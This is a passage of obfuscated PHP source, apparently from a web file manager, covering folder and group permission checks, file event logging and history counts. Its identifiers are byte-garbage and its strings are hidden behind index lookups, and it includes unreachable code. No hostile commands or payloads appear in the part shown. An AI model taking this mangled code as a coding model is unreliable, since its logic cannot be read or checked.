$ğéŠñÒ¹[$¡ğÓŸÏ[32]], $¡ğÓŸÏ[87] => KodIO::make($ğéŠñÒ¹[$¡ğÓŸÏ[194]]), $¡ğÓŸÏ[2199] => $æäŠí); } private function groupAuthInfo($æ±É­È, $Æè“øÂ¬) { $¶’Ú¯Š– =& $_SERVER[ˆö¿ÚÌ¼]; $Ó ê€¦Õ = Model($¶’Ú¯Š–[599])->getInfo($Æè“øÂ¬); return array($¶’Ú¯Š–[2200] => intval($æ±É­È[$¶’Ú¯Š–[499]]), $¶’Ú¯Š–[2183] => $æ±É­È, $¶’Ú¯Š–[2201] => LNG($¶’Ú¯Š–[2202]), $¶’Ú¯Š–[2192] => array($¶’Ú¯Š–[506] => $Ó ê€¦Õ[$¶’Ú¯Š–[32]], $¶’Ú¯Š–[87] => KodIO::make($Ó ê€¦Õ[$¶’Ú¯Š–[90]][$¶’Ú¯Š–[194]]), $¶’Ú¯Š–[2199] => $Ó ê€¦Õ[$¶’Ú¯Š–[603]])); } protected function groupRootAuth($§”ÈˆÃÕ, $˜ßÉ´É³ = false) { $Åú»Şó÷ =& $_SERVER[ˆö¿ÚÌ¼]; $˜ßÉ´É³ = $˜ßÉ´É³ ? $˜ßÉ´É³ : USER_ID; $ñ÷Ñ»íµ = $˜ßÉ´É³ . $Åú»Şó÷[2203] . $§”ÈˆÃÕ; static $ ¥Ò“±¥ = array(); if (isset($ ¥Ò“±¥[$ñ÷Ñ»íµ])) { return $ ¥Ò“±¥[$ñ÷Ñ»íµ]; } $ÛÍ™´İ½ = Model($Åú»Şó÷[599])->getInfo($§”ÈˆÃÕ); $îÁ£çãÚ = $this->userGroupList($˜ßÉ´É³); $ÇƒË¥Í£ = isset($îÁ£çãÚ[$§”ÈˆÃÕ]) ? $îÁ£çãÚ[$§”ÈˆÃÕ][$Åú»Şó÷[499]] : !1; if ($ÇƒË¥Í£ && Model($Åú»Şó÷[585])->authCheckAction($ÇƒË¥Í£[$Åú»Şó÷[499]], $Åú»Şó÷[2007])) { $ ¥Ò“±¥[$ñ÷Ñ»íµ] = $ÇƒË¥Í£; return $ÇƒË¥Í£; } $¦ƒùò©½ = $this->sourceAuthSelect($ÛÍ™´İ½[$Åú»Şó÷[90]][$Åú»Şó÷[194]]); $ø×÷éäÔ = $¦ƒùò©½ ? $this->authMake($¦ƒùò©½, $˜ßÉ´É³) : !1; $ºĞÒ”èÑ = $ø×÷éäÔ ? $ø×÷éäÔ[$Åú»Şó÷[554]] : !1; $ ¥Ò“±¥[$ñ÷Ñ»íµ] = $ºĞÒ”èÑ ? $ºĞÒ”èÑ : $ÇƒË¥Í£; return $ ¥Ò“±¥[$ñ÷Ñ»íµ]; } public function authOwnerApply($±·Û©úã) { $×¢†€½Â =& $_SERVER[ˆö¿ÚÌ¼]; if (empty($±·Û©úã[$×¢†€½Â[499]]) || isset($±·Û©úã[$×¢†€½Â[2204]]) && $±·Û©úã[$×¢†€½Â[2204]]) { return $±·Û©úã; } if (AuthModel::authCheckRoot($±·Û©úã[$×¢†€½Â[499]][$×¢†€½Â[500]])) { return $±·Û©úã; } $«ş÷½ = Model($×¢†€½Â[1435])->parentLevelArray($±·Û©úã[$×¢†€½Â[598]]); $«ş÷½ = array_merge(array($±·Û©úã[$×¢†€½Â[194]]), array_reverse($«ş÷½)); $É²¿‹Ê˜ = $this->sourceAuthSelect($«ş÷½); $æ–ı¡‰§ = array(); $É•şĞÖ  = array(); foreach ($É²¿‹Ê˜ as $«ğÆ€êÉ => $åÎºËÕŞ) { $äöªÃÈ = $this->authFolderOwnerUser($åÎºËÕŞ); $æ–ı¡‰§[$«ğÆ€êÉ] = $äöªÃÈ; $É•şĞÖ  = array_merge($É•şĞÖ , $äöªÃÈ[$×¢†€½Â[679]]); if ($äöªÃÈ[$×¢†€½Â[2205]]) { break; } } if (count($É•şĞÖ ) == 0) { $É•şĞÖ  = $this->authFolderOwnerGroup($±·Û©úã[$×¢†€½Â[583]]); } $É•şĞÖ  = array_unique($É•şĞÖ ); if (AuthModel::authCheckRoot($±·Û©úã[$×¢†€½Â[499]][$×¢†€½Â[500]])) { $É•şĞÖ [] = USER_ID; } $±·Û©úã[$×¢†€½Â[499]][$×¢†€½Â[2206]] = Model($×¢†€½Â[591])->userListInfo($É•şĞÖ ); return $±·Û©úã; } private function authFolderOwnerGroup($áï³àşÔ) { $ÑÇ§¥Çà =& $_SERVER[ˆö¿ÚÌ¼]; $¦Şª„”ª = Model($ÑÇ§¥Çà[2080])->where(array($ÑÇ§¥Çà[1986] => $áï³àşÔ))->select(); $ÀóÉûÈÉ = array(); if (!$¦Şª„”ª) { return $ÀóÉûÈÉ; } foreach ($¦Şª„”ª as $Õ´¹½„¯) { $ïÄƒˆ = $this->authInfo($Õ´¹½„¯); if (AuthModel::authCheckRoot($ïÄƒˆ[$ÑÇ§¥Çà[499]])) { $ÀóÉûÈÉ[] = $Õ´¹½„¯[$ÑÇ§¥Çà[1785]]; } } return $ÀóÉûÈÉ; } private function authFolderOwnerUser($¦½Èâìš) { $÷ıüŠß =& $_SERVER[ˆö¿ÚÌ¼]; $¡—â°üá = array(); $ğÁ©£ÀÆ = !1; foreach ($¦½Èâìš as $İ°æ€¿°) { $ªÃ¯İ–Ê = $this->authInfo($İ°æ€¿°); if ($İ°æ€¿°[$÷ıüŠß[583]] == $÷ıüŠß[231]) { $ğÁ©£ÀÆ = !0; } if ($İ°æ€¿°[$÷ıüŠß[191]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ªÃ¯İ–Ê[$÷ıüŠß[499]])) { $¡—â°üá[] = $İ°æ€¿°[$÷ıüŠß[583]]; } } } return array($÷ıüŠß[679] => $¡—â°üá, $÷ıüŠß[2205] => $ğÁ©£ÀÆ); } public function authMake($´µà•“’, $¼ şõ»æ = false) { $ŸŞš´¡¸ =& $_SERVER[ˆö¿ÚÌ¼]; $“òÆ­ĞÜ = $this->authArrayCheck($´µà•“’, $¼ şõ»æ); if ($“òÆ­ĞÜ[$ŸŞš´¡¸[2207]]) { $“òÆ­ĞÜ[$ŸŞš´¡¸[2207]] = $this->sourceAuthInfo($“òÆ­ĞÜ[$ŸŞš´¡¸[2207]]); } return $“òÆ­ĞÜ; } public function authArrayCheck($ìÜºùº, $Ü»Œ´³ô = false) { $Á¿Ø¡æ¸ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$ìÜºùº) { return array($Á¿Ø¡æ¸[500] => 0, $Á¿Ø¡æ¸[554] => !1); } $Ü»Œ´³ô = $Ü»Œ´³ô ? $Ü»Œ´³ô : USER_ID; $ÜÄ†œ‡‡ = 0; $¡ ÅóÕ… = 0; $‚ÑÔİ‡­ = 0; $ëÉëˆ¦© = 0; $Å±¬¾çÓ = 0; $†¿«âí¹ = 0; $ú½Û²ƒ = 1000; $Èî€û£© = 0; $†•ó¹® = 0; $‚ïÏ—§Ñ = 0; $Œ‘Ş£ÙÑ = 0; $à³Ğˆß = array($Á¿Ø¡æ¸[194] => 0); foreach ($ìÜºùº as $à³Ğˆß) { $Ä»Ğà»û = $this->authInfo($à³Ğˆß); if (!$Ä»Ğà»û) { continue; } $¢¬ÁÕŸ· = $à³Ğˆß[$Á¿Ø¡æ¸[583]]; $Ëú“ã¼ = intval($Ä»Ğà»û[$Á¿Ø¡æ¸[499]]); if ($à³Ğˆß[$Á¿Ø¡æ¸[191]] == SourceModel::TYPE_USER && $¢¬ÁÕŸ· == $Ü»Œ´³ô) { $ÜÄ†œ‡‡ = !0; $‚ÑÔİ‡­ = $Ä»Ğà»û; $¡ ÅóÕ… = $Ëú“ã¼; } else { if ($à³Ğˆß[$Á¿Ø¡æ¸[191]] == SourceModel::TYPE_GROUP && $this->groupContainUser($¢¬ÁÕŸ·, $Ü»Œ´³ô)) { $ëÉëˆ¦© = !0; $¾„…íµ— = $this->groupStepToUserGroup($¢¬ÁÕŸ·, $Ü»Œ´³ô); if ($¾„…íµ— < $ú½Û²ƒ) { $ú½Û²ƒ = $¾„…íµ—; $Å±¬¾çÓ = $Ëú“ã¼; $†¿«âí¹ = $Ä»Ğà»û; $Èî€û£© = $¢¬ÁÕŸ·; } if ($¾„…íµ— == $ú½Û²ƒ && $Ëú“ã¼ >= $Å±¬¾çÓ) { $Å±¬¾çÓ = $Ëú“ã¼; $†¿«âí¹ = $Ä»Ğà»û; $Èî€û£© = $¢¬ÁÕŸ·; } } else { if ($¢¬ÁÕŸ· == $Á¿Ø¡æ¸[231]) { $†•ó¹® = !0; $Œ‘Ş£ÙÑ = $Ä»Ğà»û; $‚ïÏ—§Ñ = $Ëú“ã¼; } } } } if ($ÜÄ†œ‡‡) { $ƒª–ÉúÙ = $¡ ÅóÕ…; $Ä»Ğà»û = $‚ÑÔİ‡­; $Çé¸Ñˆ = LNG($Á¿Ø¡æ¸[2208]); } else { if ($ëÉëˆ¦©) { $ƒª–ÉúÙ = $Å±¬¾çÓ; $Ä»Ğà»û = $†¿«âí¹; $Í™Í¡ˆü = Model($Á¿Ø¡æ¸[599])->getInfo($Èî€û£©); $Çé¸Ñˆ = $Á¿Ø¡æ¸[176] . $Í™Í¡ˆü[$Á¿Ø¡æ¸[603]] . $Á¿Ø¡æ¸[2209] . LNG($Á¿Ø¡æ¸[2210]); } else { if ($†•ó¹®) { $ƒª–ÉúÙ = $‚ïÏ—§Ñ; $Ä»Ğà»û = $Œ‘Ş£ÙÑ; $Çé¸Ñˆ = LNG($Á¿Ø¡æ¸[2180]); } else { $ƒª–ÉúÙ = 0; $Ä»Ğà»û = !1; $Çé¸Ñˆ = $Á¿Ø¡æ¸[12]; } } } $ˆ—Ô£çÑ = array($Á¿Ø¡æ¸[2200] => intval($ƒª–ÉúÙ), $Á¿Ø¡æ¸[2183] => $Ä»Ğà»û, $Á¿Ø¡æ¸[2201] => $Çé¸Ñˆ, $Á¿Ø¡æ¸[2192] => $à³Ğˆß[$Á¿Ø¡æ¸[194]]); return $ˆ—Ô£çÑ; } private function groupContainUser($ÃíÒÚØè, $Š’‹’øŠ = false) { return in_array($ÃíÒÚØè, $this->userGroupParents($Š’‹’øŠ)); } private function groupStepToUserGroup($¦¥÷¶ƒš, $´ê¨Ş¡Ú = false) { $ñ‡éè Ú =& $_SERVER[ˆö¿ÚÌ¼]; $øã—ŠêÔ = $this->userGroupList($´ê¨Ş¡Ú); $èò²¹Áé = 1000; $²®‚Ş¦€ = $GLOBALS[$ñ‡éè Ú[6]][$ñ‡éè Ú[92]][$ñ‡éè Ú[2093]] == 1; $è±ñ¢üù = $²®‚Ş¦€ ? 3 : 2; foreach ($øã—ŠêÔ as $ÉÈ¿¿¤‹) { if ($ÉÈ¿¿¤‹[$ñ‡éè Ú[1986]] == $¦¥÷¶ƒš) { return 0; } $„Ü˜•” = explode($ñ‡éè Ú[50], trim($ÉÈ¿¿¤‹[$ñ‡éè Ú[598]], $ñ‡éè Ú[50])); if ($„Ü˜•”[0] == $ñ‡éè Ú[231] && count($„Ü˜•”) > $è±ñ¢üù) { $¼€–ôğ’ = array_reverse(array_slice($„Ü˜•”, $è±ñ¢üù)); $õ˜Ï£Û› = array_search($¦¥÷¶ƒš, $¼€–ôğ’); if ($õ˜Ï£Û› !== !1 && $õ˜Ï£Û› + 1 <= $èò²¹Áé) { $èò²¹Áé = $õ˜Ï£Û› + 1; } } } return $èò²¹Áé; } private function userGroupList($ĞãÜõƒŞ = false) { $³™Ï³± =& $_SERVER[ˆö¿ÚÌ¼]; static $†°í¢é = array(); if (isset($†°í¢é[$ĞãÜõƒŞ])) { return $†°í¢é[$ĞãÜõƒŞ]; } $ú…åÃ€ = Model($³™Ï³±[611])->getInfo($ĞãÜõƒŞ); $†°í¢é[$ĞãÜõƒŞ] = array_to_keyvalue($ú…åÃ€[$³™Ï³±[2181]], $³™Ï³±[1986]); return $†°í¢é[$ĞãÜõƒŞ]; } public function userGroupParents($˜†áØíú) { $Ãş¹ÈÄÒ =& $_SERVER[ˆö¿ÚÌ¼]; static $¬ÉÑá¸® = array(); $˜†áØíú = $˜†áØíú ? $˜†áØíú : USER_ID; if (isset($¬ÉÑá¸®[$˜†áØíú])) { return $¬ÉÑá¸®[$˜†áØíú]; } $ˆ÷«¾œê = $this->userGroupList($˜†áØíú); $­—ÄïÄê = array(); $‡ŠææÕò = $GLOBALS[$Ãş¹ÈÄÒ[6]][$Ãş¹ÈÄÒ[92]][$Ãş¹ÈÄÒ[2093]] == 1; $ñö’Ù = $‡ŠææÕò ? 3 : 2; foreach ($ˆ÷«¾œê as $›ÛçŒ¿¿) { $è¨º¥” = array($›ÛçŒ¿¿[$Ãş¹ÈÄÒ[1986]]); $’­ÍôÚ = explode($Ãş¹ÈÄÒ[50], trim($›ÛçŒ¿¿[$Ãş¹ÈÄÒ[598]], $Ãş¹ÈÄÒ[50])); if ($’­ÍôÚ[0] == $Ãş¹ÈÄÒ[231] && count($’­ÍôÚ) > $ñö’Ù) { $ªÈíÛ™ß = array_slice($’­ÍôÚ, $ñö’Ù); $è¨º¥” = array_merge($è¨º¥”, array_reverse($ªÈíÛ™ß)); } $­—ÄïÄê = array_merge($­—ÄïÄê, $è¨º¥”); } $¬ÉÑá¸®[$˜†áØíú] = array_unique($­—ÄïÄê); return $¬ÉÑá¸®[$˜†áØíú]; } public function authTargetInfoMake($Áåî³ æ) { $¯™»¼è =& $_SERVER[ˆö¿ÚÌ¼]; $éÉˆé³ö = array(); $ß…´·Î  = array(); foreach ($Áåî³ æ as $ÚÅÖü±ğ) { if ($ÚÅÖü±ğ[$¯™»¼è[191]] == SourceModel::TYPE_USER) { $éÉˆé³ö[] = intval($ÚÅÖü±ğ[$¯™»¼è[583]]); } else { if ($ÚÅÖü±ğ[$¯™»¼è[191]] == SourceModel::TYPE_GROUP) { $ß…´·Î [] = intval($ÚÅÖü±ğ[$¯™»¼è[583]]); } } } if ($éÉˆé³ö) { $éÉˆé³ö = Model($¯™»¼è[591])->userListInfo($éÉˆé³ö); } if ($ß…´·Î ) { $ëŞÂŸ±˜ = array($¯™»¼è[2078] => array($¯™»¼è[504], $ß…´·Î )); $ß…´·Î  = Model($¯™»¼è[599])->field($¯™»¼è[2211])->where($ëŞÂŸ±˜)->select(); $ß…´·Î  = array_to_keyvalue($ß…´·Î , $¯™»¼è[1986]); } return array($¯™»¼è[2212] => $éÉˆé³ö, $¯™»¼è[2213] => $ß…´·Î ); } public function authInfo($Ö˜¥½èÌ) { $••„–¯¿ =& $_SERVER[ˆö¿ÚÌ¼]; if ($Ö˜¥½èÌ[$••„–¯¿[2094]]) { $ÒãŞÚ¡é = Model($••„–¯¿[585])->listData($Ö˜¥½èÌ[$••„–¯¿[2094]]); if (!$ÒãŞÚ¡é) { return !1; $°¸‡ÒÄ† = Model($••„–¯¿[585])->listData(); $–ŞæÚƒ = array_filter_by_field($°¸‡ÒÄ†, $••„–¯¿[499], $••„–¯¿[231]); return $–ŞæÚƒ; } $›ïª÷“½ = array_field_key($ÒãŞÚ¡é, array($••„–¯¿[478], $••„–¯¿[32], $••„–¯¿[499], $••„–¯¿[2009], $••„–¯¿[2010])); $›ïª÷“½[$••„–¯¿[2214]] = $Ö˜¥½èÌ; return $›ïª÷“½; } else { return array($••„–¯¿[505] => 0, $••„–¯¿[1992] => $Ö˜¥½èÌ[$••„–¯¿[2158]], $••„–¯¿[506] => $••„–¯¿[12], $••„–¯¿[2009] => $••„–¯¿[2215]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\x75\x72\143\x65\x5f\145\x76\x65\x6e\164"; protected $dataAuto = array(array("\x63\162\145\x61\x74\145\x54\x69\x6d\x65", "\x74\151\155\x65", "\x69\x6e\x73\145\162\x74", "\146\x75\156\x63\164\x69\157\x6e"), array("\x64\x65\x73\x63", '', "\x69\156\x73\145\x72\x74\54\165\x70\x64\x61\x74\145\x2c\163\145\154\145\143\164", "\152\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($çó›Û½â, $öÃÁ¦à“, $Ã•ü¹†˜ = '') { $Ø„Ÿ‘©€ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->eventSave) { return; } $ş·“ÍÌ° = Model($Ø„Ÿ‘©€[1435])->sourceInfo($çó›Û½â); if (!$ş·“ÍÌ°) { return !1; } if ($this->isDisableEvent($ş·“ÍÌ°, $öÃÁ¦à“)) { return; } if ($Ã•ü¹†˜ && is_string($Ã•ü¹†˜)) { $Ã•ü¹†˜ = array($Ø„Ÿ‘©€[2025] => $Ã•ü¹†˜); } $óôØÆ€ = defined($Ø„Ÿ‘©€[2216]) ? USER_ID : 0; $­Àóï»ß = array($Ø„Ÿ‘©€[503] => $çó›Û½â, $Ø„Ÿ‘©€[2217] => $ş·“ÍÌ°[$Ø„Ÿ‘©€[193]], $Ø„Ÿ‘©€[2218] => $ş·“ÍÌ°[$Ø„Ÿ‘©€[32]], $Ø„Ÿ‘©€[596] => !empty($ş·“ÍÌ°[$Ø„Ÿ‘©€[596]]) ? $ş·“ÍÌ°[$Ø„Ÿ‘©€[596]] : $Ø„Ÿ‘©€[12], $Ø„Ÿ‘©€[1776] => $óôØÆ€, $Ø„Ÿ‘©€[508] => $öÃÁ¦à“, $Ø„Ÿ‘©€[1778] => $Ã•ü¹†˜); $this->addSystemLog($öÃÁ¦à“, $­Àóï»ß); unset($­Àóï»ß[$Ø„Ÿ‘©€[2218]], $­Àóï»ß[$Ø„Ÿ‘©€[596]]); return $this->add($­Àóï»ß); } private function addSystemLog($¾Û¶ˆÅõ, $«éúŒêê) { $æšıÈòú =& $_SERVER[ˆö¿ÚÌ¼]; if ($¾Û¶ˆÅõ == $æšıÈòú[2219]) { $¾Û¶ˆÅõ = $«éúŒêê[$æšıÈòú[538]][$æšıÈòú[2220]]; } else { if (in_array($¾Û¶ˆÅõ, array($æšıÈòú[1965], $æšıÈòú[2221]))) { $¾Û¶ˆÅõ = $«éúŒêê[$æšıÈòú[538]][$æšıÈòú[171]]; } } $åÏë……÷ = array_merge($«éúŒêê, array($æšıÈòú[2222] => $«éúŒêê[$æšıÈòú[194]], $æšıÈòú[2223] => $«éúŒêê[$æšıÈòú[2223]])); Hook::trigger($æšıÈòú[2224], $æšıÈòú[2225] . $¾Û¶ˆÅõ, $«éúŒêê); Model($æšıÈòú[1929])->addLog($æšıÈòú[2225] . $¾Û¶ˆÅõ, $åÏë……÷); } private function isDisableEvent($ã³½¡‰¦, $»ªŠ‘ßØ) { $¸±˜€´† =& $_SERVER[ˆö¿ÚÌ¼]; if ($ã³½¡‰¦[$¸±˜€´†[191]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($»ªŠ‘ßØ == $¸±˜€´†[1954]) { return !1; } return !0; } public function eventCreate($œÚ× Ç…, $ò€îõ’¯) { $â¶ã³¡ˆ =& $_SERVER[ˆö¿ÚÌ¼]; $İóÌ§¹ª = Model($â¶ã³¡ˆ[1435])->sourceInfo($œÚ× Ç…); $Œ«Ÿ¬ = array($â¶ã³¡ˆ[2220] => $ò€îõ’¯, $â¶ã³¡ˆ[32] => $İóÌ§¹ª[$â¶ã³¡ˆ[32]]); return $this->addEvent($œÚ× Ç…, $â¶ã³¡ˆ[2219], $Œ«Ÿ¬); } public function eventFileEdit($§õëÃø´) { $ô¨¡ÆÖÂ =& $_SERVER[ˆö¿ÚÌ¼]; $Ñİ¶ß´· = array($ô¨¡ÆÖÂ[2226] => $_SERVER[$ô¨¡ÆÖÂ[2227]], $ô¨¡ÆÖÂ[2228] => strtolower(ACTION)); if (isset($GLOBALS[$ô¨¡ÆÖÂ[7]][$ô¨¡ÆÖÂ[2229]])) { $Ñİ¶ß´·[$ô¨¡ÆÖÂ[2229]] = $ô¨¡ÆÖÂ[91]; } return $this->addEvent($§õëÃø´, $ô¨¡ÆÖÂ[1955], $Ñİ¶ß´·); } public function eventRecycle($ĞíŸ”ôÁ, $ üùÇ¬à) { return $this->addEvent($ĞíŸ”ôÁ, $_SERVER[ˆö¿ÚÌ¼][2221], $ üùÇ¬à); } private static $_removeLast = ''; public function eventRemove($´İ¬Æ£) { $÷ûôô¬ä =& $_SERVER[ˆö¿ÚÌ¼]; self::$_removeLast = $´İ¬Æ£; $è©ı©°™ = Model($÷ûôô¬ä[1435])->sourceInfo($´İ¬Æ£); $•“ôÛ‚İ = array_field_key($è©ı©°™, array($÷ûôô¬ä[194], $÷ûôô¬ä[555], $÷ûôô¬ä[517], $÷ûôô¬ä[598])); $ñ²¹Ø£± = array($÷ûôô¬ä[171] => $è©ı©°™[$÷ûôô¬ä[32]], $÷ûôô¬ä[2228] => ACTION, $÷ûôô¬ä[2230] => $•“ôÛ‚İ); return $this->addEvent($è©ı©°™[$÷ûôô¬ä[193]], $÷ûôô¬ä[1954], $ñ²¹Ø£±); } public function eventShare($å—Íç¹£, $ûóëÚÁú) { return $this->addEvent($å—Íç¹£, $_SERVER[ˆö¿ÚÌ¼][1965], $ûóëÚÁú); } public function eventMove($Œ‰©õª›, $Ããõ¨½”, $Ù‡©÷ë) { $ ­İÎß =& $_SERVER[ˆö¿ÚÌ¼]; if (self::$_removeLast == $Œ‰©õª›) { return; } $æúÑò”‹ = Model($ ­İÎß[1435]); $¢²¬±ÀÖ = $æúÑò”‹->sourceInfo($Œ‰©õª›); $ûùİª† = $æúÑò”‹->sourceInfo($Ããõ¨½”); $ÛÄƒşÜÉ = $æúÑò”‹->sourceInfo($Ù‡©÷ë); $ÌÔşòø– = array($ ­İÎß[1255] => $Ããõ¨½”, $ ­İÎß[2231] => $ûùİª†[$ ­İÎß[32]], $ ­İÎß[2207] => !empty($ûùİª†[$ ­İÎß[596]]) ? $ûùİª†[$ ­İÎß[596]] : $ ­İÎß[12], $ ­İÎß[1256] => $Ù‡©÷ë, $ ­İÎß[2232] => $ÛÄƒşÜÉ[$ ­İÎß[32]], $ ­İÎß[2233] => !empty($ÛÄƒşÜÉ[$ ­İÎß[596]]) ? $ÛÄƒşÜÉ[$ ­İÎß[596]] : $ ­İÎß[12]); $this->addEvent($Œ‰©õª›, $ ­İÎß[637], $ÌÔşòø–); $¢²¬±ÀÖ = $æúÑò”‹->sourceInfo($Œ‰©õª›); $ÌÔşòø– = array($ ­İÎß[194] => $¢²¬±ÀÖ[$ ­İÎß[194]], $ ­İÎß[32] => $¢²¬±ÀÖ[$ ­İÎß[32]]); $this->addEvent($Ããõ¨½”, $ ­İÎß[2234], $ÌÔşòø–); } public function eventCopy($ëÊÃ¸ï•) { $this->eventCreate($ëÊÃ¸ï•, $_SERVER[ˆö¿ÚÌ¼][635]); } public function eventRename($ºÚåÁÛß, $ô’“Ü«¥, $Ô·“Êóù) { $‹˜·úõ» =& $_SERVER[ˆö¿ÚÌ¼]; $È¤òˆ“¾ = array($‹˜·úõ»[1255] => $ô’“Ü«¥, $‹˜·úõ»[1256] => $Ô·“Êóù); return $this->addEvent($ºÚåÁÛß, $‹˜·úõ»[1449], $È¤òˆ“¾); } public function eventAddComment($‡ÄÎÔ¦, $±«Â¸ÏØ) { return $this->addEvent($‡ÄÎÔ¦, $_SERVER[ˆö¿ÚÌ¼][2235], $±«Â¸ÏØ); } public function eventAddDesc($£ÛÃÏ´, $Üéà­ü–) { return $this->addEvent($£ÛÃÏ´, $_SERVER[ˆö¿ÚÌ¼][2236], $Üéà­ü–); } public function listBySource($Ü£Œº®) { $¼ÖŸ÷Á =& $_SERVER[ˆö¿ÚÌ¼]; $ÍµÀŸë¯ = Model($¼ÖŸ÷Á[1435])->sourceInfo($Ü£Œº®); $Â´½¬ÂÜ = array($¼ÖŸ÷Á[503] => $Ü£Œº®); if ($ÍµÀŸë¯[$¼ÖŸ÷Á[497]] == $¼ÖŸ÷Á[91]) { $º ƒØÆ˜ = Model($¼ÖŸ÷Á[1435])->listSearchChildren($Ü£Œº®, 20000); $º ƒØÆ˜[] = $Ü£Œº® . $¼ÖŸ÷Á[457]; $Â´½¬ÂÜ = array($¼ÖŸ÷Á[194] => array($¼ÖŸ÷Á[7], $º ƒØÆ˜)); } $ûŠØ‰½ = $this->where($Â´½¬ÂÜ)->order($¼ÖŸ÷Á[2237])->selectPage(); if ($ûŠØ‰½[$¼ÖŸ÷Á[445]][$¼ÖŸ÷Á[446]] == 0) { $ûŠØ‰½[$¼ÖŸ÷Á[445]][$¼ÖŸ÷Á[446]] = 1; $ûŠØ‰½[$¼ÖŸ÷Á[448]] = array(array($¼ÖŸ÷Á[503] => $Ü£Œº®, $¼ÖŸ÷Á[2217] => $ÍµÀŸë¯[$¼ÖŸ÷Á[193]], $¼ÖŸ÷Á[1776] => $ÍµÀŸë¯[$¼ÖŸ÷Á[539]], $¼ÖŸ÷Á[508] => $¼ÖŸ÷Á[2238], $¼ÖŸ÷Á[509] => $ÍµÀŸë¯[$¼ÖŸ÷Á[234]], $¼ÖŸ÷Á[1778] => $¼ÖŸ÷Á[12])); } return $this->eventListParse($ûŠØ‰½, $Ü£Œº®); } private function eventListParse($½Ÿ²å™, $¯äÍ‘Š) { $»ñìØ¨§ =& $_SERVER[ˆö¿ÚÌ¼]; $Ôœ×º» = $½Ÿ²å™[$»ñìØ¨§[448]]; $šøŞÛ… = array_to_keyvalue($Ôœ×º», $»ñìØ¨§[12], $»ñìØ¨§[194]); $æÖ¡êşÊ = array_to_keyvalue($Ôœ×º», $»ñìØ¨§[12], $»ñìØ¨§[2223]); foreach ($Ôœ×º» as $€ˆæ¾‡’) { $„º¾ïõ = $€ˆæ¾‡’[$»ñìØ¨§[538]]; if ($€ˆæ¾‡’[$»ñìØ¨§[33]] == $»ñìØ¨§[637] && isset($„º¾ïõ[$»ñìØ¨§[1255]])) { $šøŞÛ…[] = $„º¾ïõ[$»ñìØ¨§[1255]] . $»ñìØ¨§[12]; $šøŞÛ…[] = $„º¾ïõ[$»ñìØ¨§[1256]] . $»ñìØ¨§[12]; } if ($€ˆæ¾‡’[$»ñìØ¨§[33]] == $»ñìØ¨§[2234] && isset($„º¾ïõ[$»ñìØ¨§[194]])) { $šøŞÛ…[] = $„º¾ïõ[$»ñìØ¨§[194]] . $»ñìØ¨§[12]; } } $šøŞÛ… = array_merge($šøŞÛ…, $æÖ¡êşÊ, array($¯äÍ‘Š . $»ñìØ¨§[12])); $šøŞÛ… = array_unique($šøŞÛ…); $˜—ó‚¿Ñ = array_unique(array_to_keyvalue($Ôœ×º», $»ñìØ¨§[12], $»ñìØ¨§[1785])); $¢´š”îê = Model($»ñìØ¨§[611])->userListInfo($˜—ó‚¿Ñ); $ÇîØö“ = Model($»ñìØ¨§[915])->sourceListInfo($šøŞÛ…, !0); foreach ($Ôœ×º» as &$€ˆæ¾‡’) { if ($€ˆæ¾‡’[$»ñìØ¨§[33]] == $»ñìØ¨§[637] && isset($€ˆæ¾‡’[$»ñìØ¨§[538]][$»ñìØ¨§[1255]])) { $€ˆæ¾‡’[$»ñìØ¨§[538]][$»ñìØ¨§[1255]] = $ÇîØö“[$€ˆæ¾‡’[$»ñìØ¨§[538]][$»ñìØ¨§[1255]]]; $€ˆæ¾‡’[$»ñìØ¨§[538]][$»ñìØ¨§[1256]] = $ÇîØö“[$€ˆæ¾‡’[$»ñìØ¨§[538]][$»ñìØ¨§[1256]]]; } if ($€ˆæ¾‡’[$»ñìØ¨§[33]] == $»ñìØ¨§[2234] && isset($€ˆæ¾‡’[$»ñìØ¨§[538]][$»ñìØ¨§[194]])) { $€ˆæ¾‡’[$»ñìØ¨§[538]][$»ñìØ¨§[194]] = $ÇîØö“[$€ˆæ¾‡’[$»ñìØ¨§[538]][$»ñìØ¨§[194]]]; } $€ˆæ¾‡’[$»ñìØ¨§[90]] = $ÇîØö“[$€ˆæ¾‡’[$»ñìØ¨§[194]]]; $€ˆæ¾‡’[$»ñìØ¨§[2239]] = $ÇîØö“[$€ˆæ¾‡’[$»ñìØ¨§[2223]]]; if ($€ˆæ¾‡’[$»ñìØ¨§[33]] == $»ñìØ¨§[1954]) { $€ˆæ¾‡’[$»ñìØ¨§[2239]] = $€ˆæ¾‡’[$»ñìØ¨§[90]]; $€ˆæ¾‡’[$»ñìØ¨§[2223]] = $€ˆæ¾‡’[$»ñìØ¨§[2239]][$»ñìØ¨§[194]]; $€ˆæ¾‡’[$»ñìØ¨§[90]] = !1; $€ˆæ¾‡’[$»ñìØ¨§[194]] = $»ñìØ¨§[12]; } $€ˆæ¾‡’[$»ñìØ¨§[2166]] = $¢´š”îê[$€ˆæ¾‡’[$»ñìØ¨§[1785]]]; } unset($€ˆæ¾‡’); $½Ÿ²å™[$»ñìØ¨§[448]] = $Ôœ×º»; return $½Ÿ²å™; } public function removeBySource($°äÖ‰×) { $µïƒºä× = array($_SERVER[ˆö¿ÚÌ¼][503] => $°äÖ‰×); $this->where($µïƒºä×)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\165\162\143\145\137\x68\x69\163\x74\x6f\162\171"; public function historyCount($Š³š½µŸ) { $³œ¹Ÿü¸ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$Š³š½µŸ) { return array(); } if (is_string($Š³š½µŸ) || is_int($Š³š½µŸ)) { $Š³š½µŸ = array($Š³š½µŸ); } $Í‘¸ÇÁå = array($³œ¹Ÿü¸[194], $³œ¹Ÿü¸[2240] => $³œ¹Ÿü¸[579]); $¨Œ¢¤²Ö = array($³œ¹Ÿü¸[194] => array($³œ¹Ÿü¸[7], $Š³š½µŸ)); $™íØÂ¥¤ = $this->field($Í‘¸ÇÁå)->where($¨Œ¢¤²Ö)->group($³œ¹Ÿü¸[194])->select(); return array_to_keyvalue($™íØÂ¥¤, $³œ¹Ÿü¸[194], $³œ¹Ÿü¸[579]); } public function 